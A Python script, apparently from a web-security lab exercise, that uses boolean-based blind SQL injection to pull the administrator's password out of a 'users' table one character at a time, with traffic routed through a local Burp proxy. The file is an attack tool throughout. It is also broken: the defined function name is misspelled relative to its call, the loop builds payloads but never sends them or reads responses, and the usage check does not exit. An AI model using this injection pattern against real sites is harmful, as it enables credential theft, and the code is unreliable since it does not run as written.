import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())

#Sending the requests to burp, to able to debug, incase of an error.
proxies = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#Function that will show in real time the password entries, until it finds the matching password. 
def sqli_passowrd(url):
    password_extracted = ''
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' AND (SELECT ascii(SUBSTRING(password,%s,1)) FROM users WHERE username = 'administrator')>'%s" %(i,j)
            sqli_payload_encode = urllib.parse.quote(sqli_payload)

def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        #Correct way
        print("[+] Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("[+] Retrieving administrator password")
    sqli_password(url)

if __name__ == "__main__":
    main()